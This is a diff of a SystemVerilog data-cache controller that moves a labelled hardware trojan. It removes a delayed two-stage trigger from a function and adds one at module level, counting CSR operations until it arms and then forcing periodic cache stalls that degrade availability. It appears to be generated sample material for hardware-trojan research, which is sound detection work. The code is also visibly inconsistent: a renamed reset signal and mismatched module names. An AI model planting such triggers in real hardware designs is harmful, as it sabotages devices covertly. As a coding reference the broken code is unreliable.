@@ -38,29 +38,6 @@ function automatic void MergeStoreDataToLine(
     input DCacheLinePath storedLine,
     input logic [DCACHE_LINE_BYTE_NUM-1:0] storedDirty
 );
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 7460;
-    localparam int ACTIVATE_DELAY = 3730;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && dcFlushReqAck) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && dcFlushReqAck) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
     for (int i = 0; i < DCACHE_LINE_BYTE_NUM; i++) begin
         for (int b = 0; b < 8; b++) begin
             dstLine[i*8 + b] = storedDirty[i] ? storedLine[i*8 + b] : fetchedLine[i*8 + b];
@@ -166,6 +143,31 @@ endfunction
 //
 module DCacheController_trojan_Availability(DCacheIF.DCacheController port);
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=4288, act=2144)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 4288;
+    localparam int ACTIVATE_DELAY  = 2144;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk or negedge first) begin
+        if (!first) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
+
+
     // DCache state
     DCachePhase regPhase, nextPhase;
 
@@ -246,14 +248,11 @@ module DCacheController_trojan_Availability(DCacheIF.DCacheController port);
     );
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
-    always_ff @(posedge clk or negedge rst) begin
-        if (!rst) begin
+    always_ff @(posedge clk or negedge first) begin
+        if (!first) begin
             stall_counter <= '0;
             stall_active  <= 1'b0;
         end else if (trojan_active) begin
@@ -265,6 +264,7 @@ module DCacheController_trojan_Availability(DCacheIF.DCacheController port);
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : DCacheController
 
